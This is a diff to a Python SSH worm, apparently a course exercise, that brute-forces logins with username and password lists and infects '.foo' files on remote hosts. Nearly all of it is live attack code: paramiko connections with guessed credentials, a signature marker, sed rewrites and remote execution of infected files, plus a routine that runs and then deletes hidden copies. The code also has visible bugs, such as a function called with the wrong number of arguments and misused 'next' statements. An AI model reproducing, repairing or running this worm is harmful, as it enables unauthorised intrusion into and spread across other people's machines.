@@ -71,12 +71,8 @@
 ##       successfully infected hosts. The IP address and the login
 ##       credentials go where you find the string yyy.yyy.yyy.yyy in the
 ##       code.
-##
-##  After you have executed the worm code, you will notice that a copy of
-##  the worm has landed at the host at the IP address you used for
-##  xxx.xxx.xxx.xxx and you'll see a new directory at the host you used for
-##  yyy.yyy.yyy.yyy.  This directory will contain those files from the
-##  xxx.xxx.xxx.xxx host that contained the string `abracadabra'.
+
+
 
 import sys
 import os
@@ -142,6 +138,7 @@ def get_new_passwds(how_many):
     return passwds
 
 def get_fresh_ipaddresses(how_many):
+    print("\nwhatttt\n")
     if debug: return ['192.168.56.1','192.168.56.155']
                     # Provide one or more IP address that you
                     # want `attacked' for debugging purposes.
@@ -156,9 +153,10 @@ def get_fresh_ipaddresses(how_many):
     return ipaddresses
 
 
-def search_signature(ssh_var,files):
+def search_signature(ssh_var,received_files):
     print("\nSearching for signature...")
-    for item in files:
+    for item in received_files:
+        item = item.replace("\n","")
         IN = open(item,'r')
         all_of_it = IN.readlines()
         infected_files = []
@@ -175,6 +173,7 @@ def search_signature(ssh_var,files):
 def execute_worm_ontarget(ssh_var,received_list):
     print("\nExecuting newly infected_files...")
     for item in received_list:
+        item = item.replace("\n","")
         cmd = "python "+item
         stdin,stdout,stderr = ssh_var.exec_command(cmd)
         if stderr is None:
@@ -197,6 +196,7 @@ def execute_hiddenworm_ontarget(ssh_var):
     received_list = list(map(lambda x: x.encode('utf-8'),stdout.readlines()))
     
     for item in received_list:
+        item = item.replace("\n","")
         execute_worm = "python "+item
         stdin,stdout,stderr = ssh_var.exec_command(execute_worm)
         delete_worm = "rm "+item 
@@ -213,8 +213,6 @@ while True:
     usernames = get_new_usernames(NUSERNAMES)
     print("-----",usernames)
     passwds =   get_new_passwds(NPASSWDS)
-#    print("usernames: %s" % str(usernames))
-#    print("passwords: %s" % str(passwds))
     # First loop over passwords
     for passwd in passwds:
         # Then loop over user names
@@ -228,17 +226,16 @@ while True:
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                     print("\n\nconnected\n")
-                    
-                    
+                   
+                   
                     IN = open(sys.argv[0],'r')
                     worm = [line for (i,line) in enumerate(IN)]
                     
-                    
+                   
                     list_targets = "ls *.foo"
                     stdin, stdout, stderr = ssh.exec_command(list_targets)
                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
-                    
-		    infected_list = []
+                    print(received_list)
                     print("\nCalling search_signature")
                     infected_list = search_signature(received_list)
                     print("\nafter call")	
@@ -250,11 +247,11 @@ while True:
 
                     newly_infected = []
                     for item in received_list:                      #if received list exists then modify contents of each of the file and execute those
+                        item = item.replace("\n","")
                         IN = open(item,'r')
                         all_of_it = IN.readlines()
                         if any(line.find('!@m$tuxn3t') for line in all_of_it): next
                         print("\nInfecting more files")
-                        item = item.replace("\n","")
                         OUT = open(item,'w')
                         OUT.writelines(["!@m$tuxn3t"])
                         sed_cmd = "sed -i -e 's/^/#' %s" % item
@@ -263,6 +260,3 @@ while True:
                         OUT.close()
                         newly_infected.append(item)
                     execute_worm_ontarget(ssh,newly_infected)
-                except:
-                    next
-    if debug: break
